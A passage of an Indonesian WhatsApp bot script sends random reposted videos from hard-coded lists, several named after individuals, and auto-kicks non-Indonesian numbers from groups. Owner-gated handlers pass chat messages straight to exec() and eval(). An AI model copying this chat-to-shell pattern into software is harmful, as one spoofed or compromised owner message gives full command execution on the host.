    var viona = ['https://h.top4top.io/m_2045fs1b71.mp4', 'https://g.top4top.io/m_20453m4y71.mp4', 'https://g.top4top.io/m_2045mgrc01.mp4', 'https://f.top4top.io/m_2045p29p01.mp4', 'https://l.top4top.io/m_2045ity101.mp4', 'https://i.top4top.io/m_2045kguyy1.mp4', 'https://a.top4top.io/m_204549ynr1.mp4', 'https://b.top4top.io/m_2045y0fty1.mp4', 'https://c.top4top.io/m_20456si0m1.mp4', 'https://f.top4top.io/m_20457pmms1.mp4', 'https://h.top4top.io/m_2045gtquo1.mp4', 'https://j.top4top.io/m_204568o961.mp4', 'https://a.top4top.io/m_2045jqw861.mp4', 'https://d.top4top.io/m_2045frb0x1.mp4', 'https://c.top4top.io/m_2045xzr2v1.mp4', 'https://b.top4top.io/m_2045ae34n1.mp4', 'https://h.top4top.io/m_20453a5r81.mp4', 'https://k.top4top.io/m_2045baiy41.mp4', 'https://g.top4top.io/m_2045fjj6h1.mp4', 'https://i.top4top.io/m_2045q3tba1.mp4', 'https://d.top4top.io/m_2045npd2v1.mp4', 'https://e.top4top.io/m_2045fw9tg1.mp4', 'https://e.top4top.io/m_2045g0bgt1.mp4', 'https://k.top4top.io/m_2045opgb71.mp4'];
    var random_viona = viona[Math.floor(Math.random() * (viona.length))];
    let ini_viona = await getBuffer(random_viona);
    xdev.sendMessage(from, ini_viona, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'syania') {
    reply(mess.wait);
    var syania = ['https://f.top4top.io/m_2045x5wnd1.mp4', 'https://e.top4top.io/m_2045zv8zg1.mp4', 'https://d.top4top.io/m_2045trg5i1.mp4', 'https://c.top4top.io/m_2045xbfb51.mp4', 'https://h.top4top.io/m_2045dblc31.mp4', 'https://a.top4top.io/m_2045xd5sx1.mp4', 'https://k.top4top.io/m_2045520uv1.mp4', 'https://j.top4top.io/m_2045bplb41.mp4', 'https://i.top4top.io/m_2045x91991.mp4', 'https://l.top4top.io/m_2045jr6gs1.mp4', 'https://g.top4top.io/m_2045i9xs01.mp4', 'https://e.top4top.io/m_2045ideve1.mp4', 'https://f.top4top.io/m_2045g992t1.mp4', 'https://d.top4top.io/m_2045m180v1.mp4', 'https://c.top4top.io/m_2045n6bm31.mp4', 'https://b.top4top.io/m_2045s5r3z1.mp4', 'https://i.top4top.io/m_2045xoitc1.mp4', 'https://k.top4top.io/m_2045dur3t1.mp4', 'https://d.top4top.io/m_2045c6ddy1.mp4', 'https://j.top4top.io/m_2045nbbuc1.mp4', 'https://g.top4top.io/m_2045yinwy1.mp4', 'https://a.top4top.io/m_2045qsqhq1.mp4', 'https://c.top4top.io/m_20453tu1v1.mp4', 'https://e.top4top.io/m_2045zjbk31.mp4', 'https://f.top4top.io/m_2045n4rmz1.mp4', 'https://h.top4top.io/m_2045reqfb1.mp4', 'https://a.top4top.io/m_2045i86q21.mp4', 'https://b.top4top.io/m_20453xada1.mp4'];
    var random_syania = syania[Math.floor(Math.random() * (syania.length))];
    let ini_syania = await getBuffer(random_syania);
    xdev.sendMessage(from, ini_syania, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'riri') {
    reply(mess.wait);
    var riri = ['https://e.top4top.io/m_2045ut0en1.mp4', 'https://d.top4top.io/m_2045a5q5l1.mp4', 'https://f.top4top.io/m_2045rd0z31.mp4', 'https://c.top4top.io/m_2045zm4xy1.mp4', 'https://b.top4top.io/m_2045n6guq1.mp4', 'https://l.top4top.io/m_2045v8ck61.mp4', 'https://a.top4top.io/m_2045jbwwh1.mp4', 'https://k.top4top.io/m_2045ndl5m1.mp4', 'https://j.top4top.io/m_20457v6t61.mp4', 'https://i.top4top.io/m_2045a3gre1.mp4', 'https://h.top4top.io/m_2045tli2k1.mp4', 'https://g.top4top.io/m_2045z1u2g1.mp4', 'https://f.top4top.io/m_2045kdv2f1.mp4', 'https://e.top4top.io/m_20458qzhw1.mp4', 'https://d.top4top.io/m_20459vq7t1.mp4', 'https://c.top4top.io/m_20452b3av1.mp4', 'https://b.top4top.io/m_2045u5z3p1.mp4', 'https://a.top4top.io/m_2045l6nrb1.mp4'];
    var random_riri = riri[Math.floor(Math.random() * (riri.length))];
    let ini_riri = await getBuffer(random_riri);
    xdev.sendMessage(from, ini_riri, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'syifa') {
    reply(mess.wait);
    var syifa = ['https://h.top4top.io/m_2044bbyhm1.mp4', 'https://l.top4top.io/m_2044xa3nk1.mp4', 'https://j.top4top.io/m_20446ggxu1.mp4', 'https://d.top4top.io/m_2044rvctf1.mp4', 'https://b.top4top.io/m_2044kdgfw1.mp4', 'https://k.top4top.io/m_204432xwq1.mp4', 'https://c.top4top.io/m_204456vl01.mp4', 'https://a.top4top.io/m_2044bz2nv1.mp4', 'https://i.top4top.io/m_20440vzg41.mp4', 'https://e.top4top.io/m_20446qugg1.mp4', 'https://g.top4top.io/m_2044xrism1.mp4', 'https://c.top4top.io/m_20449iqt51.mp4', 'https://a.top4top.io/m_2044h64w01.mp4', 'https://d.top4top.io/m_20445mytg1.mp4', 'https://g.top4top.io/m_20445g4ue1.mp4', 'https://i.top4top.io/m_2044l1yk41.mp4', 'https://c.top4top.io/m_2044vpzyb1.mp4', 'https://e.top4top.io/m_20445z0xd1.mp4', 'https://d.top4top.io/m_2044qjas41.mp4', 'https://b.top4top.io/m_2044irvk41.mp4', 'https://l.top4top.io/m_2044wmw5d1.mp4', 'https://k.top4top.io/m_2044jewbq1.mp4', 'https://j.top4top.io/m_2044lo9sv1.mp4', 'https://i.top4top.io/m_2044fq2ne1.mp4', 'https://h.top4top.io/m_2044wudwv1.mp4', 'https://f.top4top.io/m_20445frga1.mp4'];
    var random_syifa = syifa[Math.floor(Math.random() * (syifa.length))];
    let ini_syifa = await getBuffer(random_syifa);
    xdev.sendMessage(from, ini_syifa, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'mama_gina') {
    reply(mess.wait);
    var mama_gina = ['https://j.top4top.io/m_2044moqoh1.mp4', 'https://a.top4top.io/m_2044kfu031.mp4', 'https://e.top4top.io/m_2044pd4q61.mp4', 'https://b.top4top.io/m_2044hd3hd1.mp4', 'https://k.top4top.io/m_2044lw3oq1.mp4', 'https://g.top4top.io/m_2044iu82p1.mp4', 'https://g.top4top.io/m_2044b4orc1.mp4', 'https://c.top4top.io/m_2044no8dz1.mp4', 'https://i.top4top.io/m_2044pxagw1.mp4', 'https://b.top4top.io/m_2044z2w4t1.mp4', 'https://c.top4top.io/m_2044lcxpj1.mp4', 'https://d.top4top.io/m_2044nvuaw1.mp4', 'https://f.top4top.io/m_20440g0o31.mp4', 'https://k.top4top.io/m_2044v2ime1.mp4', 'https://h.top4top.io/m_2044awwxm1.mp4', 'https://d.top4top.io/m_2044ht3vj1.mp4', 'https://l.top4top.io/m_2044bw2d31.mp4', 'https://i.top4top.io/m_2044zuzja1.mp4', 'https://l.top4top.io/m_2044cogw61.mp4', 'https://h.top4top.io/m_2044jasn31.mp4', 'https://j.top4top.io/m_204473eed1.mp4', 'https://a.top4top.io/m_20445wkpp1.mp4'];
    var random_mama_gina = mama_gina[Math.floor(Math.random() * (mama_gina.length))];
    let ini_mama_gina = await getBuffer(random_mama_gina);
    xdev.sendMessage(from, ini_mama_gina, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'alcakenya') {
    reply(mess.wait);
    var alcakenya = ['https://l.top4top.io/m_2044ehtwa1.mp4', 'https://k.top4top.io/m_2044h7tpc1.mp4', 'https://b.top4top.io/m_2044l37zk1.mp4', 'https://i.top4top.io/m_2044e9pqz1.mp4', 'https://j.top4top.io/m_2044obe8d1.mp4', 'https://k.top4top.io/m_2044dh7u21.mp4', 'https://c.top4top.io/m_2044o3ohe1.mp4', 'https://f.top4top.io/m_2044zm90s1.mp4', 'https://d.top4top.io/m_2044v7mo21.mp4', 'https://h.top4top.io/m_20446er9r1.mp4', 'https://g.top4top.io/m_2044o8u9t1.mp4', 'https://a.top4top.io/m_204421sn31.mp4', 'https://b.top4top.io/m_2044khyds1.mp4', 'https://a.top4top.io/m_2044vga111.mp4', 'https://l.top4top.io/m_2044mp7841.mp4', 'https://c.top4top.io/m_2044m3h8m1.mp4', 'https://f.top4top.io/m_2044ek3vd1.mp4', 'https://e.top4top.io/m_20443r9am1.mp4', 'https://d.top4top.io/m_2044g19oc1.mp4', 'https://j.top4top.io/m_20440tis11.mp4', 'https://e.top4top.io/m_2044yimnr1.mp4'];
    var random_alcakenya = alcakenya[Math.floor(Math.random() * (alcakenya.length))];
    let ini_alcakenya = await getBuffer(random_alcakenya);
    xdev.sendMessage(from, ini_alcakenya, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'mangayutri') {
    reply(mess.wait);
    var mangayutri = ['https://e.top4top.io/m_2044wm1kq1.mp4', 'https://l.top4top.io/m_2044k0psz1.mp4', 'https://c.top4top.io/m_2044y394z1.mp4', 'https://a.top4top.io/m_2044mzst31.mp4', 'https://g.top4top.io/m_2044tq6o11.mp4', 'https://f.top4top.io/m_2044z61tt1.mp4', 'https://d.top4top.io/m_2044t3dn91.mp4', 'https://k.top4top.io/m_20443i8ba1.mp4', 'https://b.top4top.io/m_2044i0ao91.mp4', 'https://l.top4top.io/m_2044dvyeb1.mp4', 'https://h.top4top.io/m_2044d5gey1.mp4', 'https://f.top4top.io/m_204484esr1.mp4', 'https://i.top4top.io/m_2044ez7y91.mp4', 'https://c.top4top.io/m_2044qkb5k1.mp4', 'https://j.top4top.io/m_2044wwdfy1.mp4', 'https://d.top4top.io/m_2044fzmw21.mp4', 'https://g.top4top.io/m_20444rprh1.mp4', 'https://e.top4top.io/m_20446919h1.mp4', 'https://a.top4top.io/m_2044unrp01.mp4', 'https://i.top4top.io/m_20441xktm1.mp4', 'https://h.top4top.io/m_20444t5dj1.mp4', 'https://f.top4top.io/m_2044l4j3r1.mp4', 'https://k.top4top.io/m_2044wb7pq1.mp4', 'https://e.top4top.io/m_2044i5rki1.mp4', 'https://j.top4top.io/m_2044s58ir1.mp4', 'https://g.top4top.io/m_2044dayid1.mp4', 'https://d.top4top.io/m_204492t8n1.mp4'];
    var random_mangayutri = mangayutri[Math.floor(Math.random() * (mangayutri.length))];
    let ini_mangayutri = await getBuffer(random_mangayutri);
    xdev.sendMessage(from, ini_mangayutri, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'rikagusriani') {
    reply(mess.wait);
    var rikagusriani = ['https://b.top4top.io/m_1930thxw90.mp4', 'https://d.top4top.io/m_1930pezhp0.mp4', 'https://c.top4top.io/m_1930cjgbx0.mp4', 'https://b.top4top.io/m_1930v6vhg0.mp4', 'https://f.top4top.io/m_1930uh7ud0.mp4', 'https://a.top4top.io/m_1930c9cpb0.mp4', 'https://k.top4top.io/m_19308amkf0.mp4', 'https://d.top4top.io/m_1930wjaq60.mp4', 'https://i.top4top.io/m_1930n2um40.mp4', 'https://i.top4top.io/m_1930e14pi0.mp4', 'https://i.top4top.io/m_1930w6lwf0.mp4', 'https://e.top4top.io/m_19307autl0.mp4', 'https://d.top4top.io/m_1930i6tfc0.mp4', 'https://c.top4top.io/m_1930qmr7u0.mp4', 'https://d.top4top.io/m_1930itbte1.mp4', 'https://i.top4top.io/m_1930ze4oq0.mp4', 'https://j.top4top.io/m_1930kkqyh1.mp4', 'https://f.top4top.io/m_1930zevlz0.mp4', 'https://g.top4top.io/m_1930q0apu1.mp4', 'https://h.top4top.io/m_1930trfsv2.mp4'];
    var random_rikagusriani = rikagusriani[Math.floor(Math.random() * (rikagusriani.length))];
    let ini_rikagusriani = await getBuffer(random_rikagusriani);
    xdev.sendMessage(from, ini_rikagusriani, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'asupan') {
    reply(mess.wait);
    var asupannih = ['http://sansekai.my.id/ptl_repost/120416207_674661289840975_7238538460676645249_n.mp4', 'http://sansekai.my.id/ptl_repost/120443017_225738842307010_1507614018538871668_n.mp4', 'http://sansekai.my.id/ptl_repost/120506710_129730895516659_9090102890235113922_n.mp4', 'http://sansekai.my.id/ptl_repost/120518115_3382156938497131_2702539154432231938_n.mp4', 'http://sansekai.my.id/ptl_repost/120533450_988960268238482_4908300175960396265_n.mp4', 'http://sansekai.my.id/ptl_repost/120554993_913582535835353_7937155730001219945_n.mp4', 'http://sansekai.my.id/ptl_repost/120565745_258483202099028_1831534734126408497_n.mp4', 'http://sansekai.my.id/ptl_repost/120570166_2716242608644571_5562452335611050430_n.mp4', 'http://sansekai.my.id/ptl_repost/120571358_3743879342322868_4731152347084614368_n.mp4', 'http://sansekai.my.id/ptl_repost/120571938_198275171805822_8506241533969509004_n.mp4', 'http://sansekai.my.id/ptl_repost/120573034_128654721967389_1837144340570017830_n.mp4', 'http://sansekai.my.id/ptl_repost/120574217_2707319792866165_3682328392840010261_n.mp4', 'http://sansekai.my.id/ptl_repost/120575986_151816433263092_6600262966520398271_n.mp4', 'http://sansekai.my.id/ptl_repost/120582400_339926344091433_2581248581156693603_n.mp4', 'http://sansekai.my.id/ptl_repost/120583739_1060190921079212_3898520254664507328_n.mp4', 'http://sansekai.my.id/ptl_repost/120587415_638776546998307_3091093882267818607_n.mp4', 'http://sansekai.my.id/ptl_repost/120589771_752670855329266_5064573607465519463_n.mp4', 'http://sansekai.my.id/ptl_repost/120613860_3393110177444352_4287165838359264124_n.mp4', 'http://sansekai.my.id/ptl_repost/120614859_768632723701773_5662521620734316774_n.mp4', 'http://sansekai.my.id/ptl_repost/120615019_149392973357031_6254963333779779708_n.mp4', 'http://sansekai.my.id/ptl_repost/120664457_338629710563119_6615226849280369453_n.mp4', 'http://sansekai.my.id/ptl_repost/120670762_191033325874671_8168246094200167609_n.mp4', 'http://sansekai.my.id/ptl_repost/120678112_971693299972883_1648826221504742220_n.mp4', 'http://sansekai.my.id/ptl_repost/120682363_1181866688854694_4233466354892721595_n.mp4', 'http://sansekai.my.id/ptl_repost/120698858_1302470566751609_3736999773452225729_n.mp4', 'http://sansekai.my.id/ptl_repost/120707049_337981777304231_3152650741169851669_n.mp4', 'http://sansekai.my.id/ptl_repost/120714412_680680702806959_2149499366562729814_n.mp4', 'http://sansekai.my.id/ptl_repost/120678112_971693299972883_1648826221504742220_n.mp4', 'http://sansekai.my.id/ptl_repost/120682363_1181866688854694_4233466354892721595_n.mp4', 'http://sansekai.my.id/ptl_repost/120698858_1302470566751609_3736999773452225729_n.mp4'];
    var random_asupannih = asupannih[Math.floor(Math.random() * (asupannih.length))];
    let ini_asupannih = await getBuffer(random_asupannih);
    xdev.sendMessage(from, ini_asupannih, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'bocil') {
    reply(mess.wait);
    var bocil = ['https://b.top4top.io/m_1931yxodg0.mp4', 'https://k.top4top.io/m_193161p380.mp4', 'https://l.top4top.io/m_1931i4g3p1.mp4', 'https://a.top4top.io/m_1931tjlio2.mp4', 'https://g.top4top.io/m_1931z2mc40.mp4', 'https://h.top4top.io/m_1931auyof1.mp4', 'https://i.top4top.io/m_19315hrle2.mp4', 'https://j.top4top.io/m_1931xul5a3.mp4', 'https://l.top4top.io/m_1931o92nr0.mp4', 'https://a.top4top.io/m_1931j1rh21.mp4', 'https://b.top4top.io/m_1931iaqpg2.mp4', 'https://c.top4top.io/m_1931s5zlj3.mp4', 'https://d.top4top.io/m_1931x0g5a4.mp4', 'https://i.top4top.io/m_1931oj76n0.mp4', 'https://j.top4top.io/m_19319gl3d1.mp4', 'https://k.top4top.io/m_1931u52cq2.mp4', 'https://l.top4top.io/m_1931mvgj73.mp4', 'https://a.top4top.io/m_1931u07oz4.mp4', 'https://j.top4top.io/m_1931h1fo60.mp4', 'https://k.top4top.io/m_1931mro3u1.mp4', 'https://l.top4top.io/m_1931kx0ac2.mp4', 'https://a.top4top.io/m_1931g9ezq3.mp4', 'https://b.top4top.io/m_1931plin14.mp4', 'https://c.top4top.io/m_1931aaxri5.mp4', 'https://d.top4top.io/m_1931ijzzn6.mp4', 'https://e.top4top.io/m_1931ugycd7.mp4', 'https://f.top4top.io/m_1931l14nk8.mp4', 'https://g.top4top.io/m_1931crgqt9.mp4'];
    var random_bocil = bocil[Math.floor(Math.random() * (bocil.length))];
    let ini_bocil = await getBuffer(random_bocil);
    xdev.sendMessage(from, ini_bocil, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'geayubi') {
    reply(mess.wait);
    var geayubi = ['https://l.top4top.io/m_1931ufrul0.mp4', 'https://a.top4top.io/m_1931jbdpk1.mp4', 'https://c.top4top.io/m_1931aj9nm2.mp4', 'https://d.top4top.io/m_1931cnsal3.mp4', 'https://e.top4top.io/m_1931d4kc74.mp4', 'https://f.top4top.io/m_1931bih8q5.mp4', 'https://g.top4top.io/m_1931xx7aa6.mp4', 'https://h.top4top.io/m_1931g3zsq7.mp4', 'https://a.top4top.io/m_1931m74wd0.mp4', 'https://b.top4top.io/m_1931p8tfm1.mp4', 'https://e.top4top.io/m_1931aj8iv0.mp4', 'https://f.top4top.io/m_1931szguy1.mp4', 'https://g.top4top.io/m_1931l73ry2.mp4', 'https://h.top4top.io/m_1931yhznj3.mp4', 'https://i.top4top.io/m_1931kmtp34.mp4', 'https://j.top4top.io/m_1931snhdg5.mp4', 'https://k.top4top.io/m_1931ay1jz6.mp4', 'https://l.top4top.io/m_1931x70mk7.mp4', 'https://a.top4top.io/m_19319mvvf8.mp4', 'https://b.top4top.io/m_1931icmzd9.mp4', 'https://h.top4top.io/m_19316oo0s0.mp4', 'https://i.top4top.io/m_1931cvvpt1.mp4'];
    var random_geayubi = geayubi[Math.floor(Math.random() * (geayubi.length))];
    let ini_geayubi = await getBuffer(random_geayubi);
    xdev.sendMessage(from, ini_geayubi, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'santuy') {
    reply(mess.wait);
    var santuy = ['https://e.top4top.io/m_1930wespy0.mp4', 'https://e.top4top.io/m_19303zfi20.mp4', 'https://j.top4top.io/m_1930t00kx0.mp4', 'https://e.top4top.io/m_1930kx7hi0.mp4', 'https://c.top4top.io/m_19307g6kd0.mp4', 'https://f.top4top.io/m_19306yk4c0.mp4', 'https://i.top4top.io/m_1930y1u780.mp4', 'https://j.top4top.io/m_1930ilsyy0.mp4', 'https://i.top4top.io/m_19301948b0.mp4', 'https://d.top4top.io/m_1930zg8460.mp4', 'https://i.top4top.io/m_19301yozl0.mp4', 'https://g.top4top.io/m_1930qjr2q0.mp4', 'https://l.top4top.io/m_1930x1wp50.mp4', 'https://a.top4top.io/m_1930zr1041.mp4', 'https://b.top4top.io/m_1930s29hq2.mp4', 'https://a.top4top.io/m_1930kbo0y0.mp4', 'https://j.top4top.io/m_1930xek9z0.mp4', 'https://i.top4top.io/m_1930s7gb80.mp4', 'https://c.top4top.io/m_1930w0dbu0.mp4', 'https://d.top4top.io/m_1930xu4kd1.mp4', 'https://a.top4top.io/m_1930zw2nb0.mp4', 'https://b.top4top.io/m_1930eybjj1.mp4', 'https://g.top4top.io/m_1930fmx330.mp4', 'https://l.top4top.io/m_1930gnlam0.mp4', 'https://g.top4top.io/m_1930twwu50.mp4', 'https://l.top4top.io/m_1930qkeh70.mp4', 'https://l.top4top.io/m_1930wefm20.mp4', 'https://a.top4top.io/m_1930idzd51.mp4'];
    var random_santuy = santuy[Math.floor(Math.random() * (santuy.length))];
    let ini_santuy = await getBuffer(random_santuy);
    xdev.sendMessage(from, ini_santuy, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'ukhty') {
    reply(mess.wait);
    var ukhty = ['https://e.top4top.io/m_1930ns2zo0.mp4', 'https://k.top4top.io/m_1930j9i810.mp4', 'https://f.top4top.io/m_1930wtj580.mp4', 'https://d.top4top.io/m_1930a2isv0.mp4', 'https://e.top4top.io/m_1930wbgc41.mp4', 'https://f.top4top.io/m_1930urbj02.mp4', 'https://b.top4top.io/m_1930ceiqv0.mp4', 'https://i.top4top.io/m_1931a0z6o0.mp4', 'https://a.top4top.io/m_193190b500.mp4', 'https://b.top4top.io/m_1931dcixz1.mp4', 'https://g.top4top.io/m_19317gpjp0.mp4', 'https://i.top4top.io/m_1931cc22w1.mp4', 'https://j.top4top.io/m_1931xn6412.mp4', 'https://g.top4top.io/m_1931silxz0.mp4', 'https://h.top4top.io/m_1931as4mg1.mp4', 'https://i.top4top.io/m_1931p9j5v0.mp4', 'https://e.top4top.io/m_1931mgeuy0.mp4', 'https://f.top4top.io/m_1931lw9381.mp4', 'https://g.top4top.io/m_1931vm0dk2.mp4', 'https://h.top4top.io/m_1931fiv8x3.mp4', 'https://b.top4top.io/m_1931jm3dt0.mp4', 'https://e.top4top.io/m_1931i7yag1.mp4', 'https://f.top4top.io/m_1931dr5ya2.mp4', 'https://g.top4top.io/m_193172kpg3.mp4', 'https://h.top4top.io/m_1931j3b224.mp4', 'https://j.top4top.io/m_19317ykt25.mp4', 'https://k.top4top.io/m_1931o0vh16.mp4', 'https://l.top4top.io/m_1931ssfbn7.mp4', 'https://a.top4top.io/m_19318t7458.mp4', 'https://b.top4top.io/m_1931vhu759.mp4'];
    var random_ukhty = ukhty[Math.floor(Math.random() * (ukhty.length))];
    let ini_ukhty = await getBuffer(random_ukhty);
    xdev.sendMessage(from, ini_ukhty, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
	

	
	
	
	
	
	
	
	
	
	
	
	
	
	




if (selectedButton == 'INFO BOTZ') {
  if(isExtream) return
                       console.log('INFO BOTZ')
                       ow = fs.readFileSync('./media/foto/bot.jpg')
                       kuk = fs.readFileSync('./media/sound/sound25.mp3')
                       mhan = await xdev.prepareMessage(from, ow, image, {thumbnail:fs.readFileSync(`./media/foto/bot1.jpg`)})
                       gbutsan = [{buttonId: 'DEVELOPER', buttonText: {displayText: 'DEVELOPER'}, type: 1},
                                              {buttonId: 'YOUTUBE', buttonText: {displayText: 'YOUTUBE'}, type: 1}]      
                       
 gbuttonan = {imageMessage: mhan.message.imageMessage,
                           contentText: info1.bot(gender,fake,nomerOwner),
                           footerText:`${fake}`,
                           buttons: gbutsan,
                           headerType: 4
                           }
await xdev.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
                         
                         contextInfo: forward})
                         setTimeout( () => {
                         xdev.sendMessage(from, kuk, audio, {mimetype: 'audio/mp4', ptt:true})
                         },3000) 
                         }
                         
                         
                         if (selectedButton == 'DEVELOPER') {
        sendKontak(from, "6285156137901", "DITTAZ", "Sibuk");
        };
                         
                         


if (selectedButton == 'YOUTUBE') {
 if(isExtream) return
console.log('YOUTUBE')
xdev.sendMessage(from, `
*YOUTUBE CHANNEL*
Kadang update kadang enggak
Support gua ya gaes dengan subs\n\nhttps://www.youtube.com/channel/UCb8NfY5H4KXVDQtOtzywfoA`,
text, {detectLinks: true, quoted: dev})
}

if (budy.startsWith('$')){
if (!dev.key.fromMe && !isOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`@X - Dev Team:~ ${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (budy.startsWith('>')){
if (!dev.key.fromMe && !isOwner) return
try {
return xdev.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: dev})
} catch(err) {
e = String(err)
reply(e)
}
}

if (budy.startsWith('=>')){
if (!isOwner && !dev.key.fromMe) return
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}

//ANTI ASING/BULE 
    if (isGroup && isKickarea && !dev.key.fromMe) {
    if (sender.includes("62")) return
    if(jeda === true) return
        jeda = true
  await xdev.groupRemove(from, [sender]);
  await sendMess("*GROUP ANTI ASING*")
  jeda = false
    }
    
//WAKTU NGANTUK BOTZ
     if (isCmd && isGroup && timeWib >= '01:00' && timeWib <= '01:49'){
     if (timeWib >= '01:00' && timeWib <= '01:49')  console.log(color('[KIRARA]', 'blue'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color('Ngantuk kak', 'cyan'))
     if (timeWib >= '01:00' && timeWib <= '01:49')  sendSticker1(ngantuk, sticker)
     }
 





          if (timeWib >= '04:00' && timeWib <= '04:10') {
          console.log(color('[KIRARA]', 'gold'), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'cyan'))
          }
          if (timeWib >= '05:00' && timeWib <= '05:10') {
          console.log(color('[KIRARA]', 'gold'), color('Udah sholat Subuh belum kak', 'cyan'))
          }
         if (timeWib >= '06:00' && timeWib <= '06:10') {
          console.log(color('[KIRARA]', 'gold'), color('Pagi kak, Jangan lupa mandi', 'cyan'))
          }
          if (timeWib >= '11:00' && timeWib <= '11:10') {
          console.log(color('[KIRARA]', 'gold'), color('Siang kak, Dah mandi blm kak?', 'cyan'))
          }
          if (timeWib >= '12:00' && timeWib <= '12:10') {
           console.log(color('[KIRARA]', 'gold'), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'cyan'))
           }
          if (timeWib >= '15:00' && timeWib <= '15:10') {
          console.log(color('[KIRARA]', 'gold'), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'cyan'))
          }
          if (timeWib >= '18:00' && timeWib <= '18:10') {
        	console.log(color('[KIRARA]', 'gold'), color('Udah mahgrip nih kak, jangan lupa sholat ya', 'cyan'))
          }
          if (timeWib >= '19:00' && timeWib <= '19:10') {
           console.log(color('[KIRARA]', 'gold'), color('Bentar lagi jam 8 kak, Yok kak main botnya buat nanti lagi', 'cyan'))
           }
          if (timeWib >= '20:00' && timeWib <= '20:10') {
           console.log(color('[KIRARA]', 'gold'), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'cyan'))
           }
          if (timeWib >= '00:00' && timeWib <= '00:10') {
           console.log(color('[KIRARA]', 'gold'), color('Kirara ngantuk kak, tidur dulu ya kak', 'cyan'))
           }
                

	}	
    } catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
    console.log(color('[SYSTEM] : %s', 'white'), color(e, 'green'))
    reply(`⏣─────「 *SYSTEM-ERROR* 」─────⏣\n\n\`\`\`${e}\`\`\`\n\n⏣─────────────────────────⏣`)     
    }
    }       
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
    if (!e.includes("jid is not defined")) {
    console.log(color('Message : %s', 'white'), color(e, 'green'))
        }
	// console.log(e)
	}
}
}




	
    
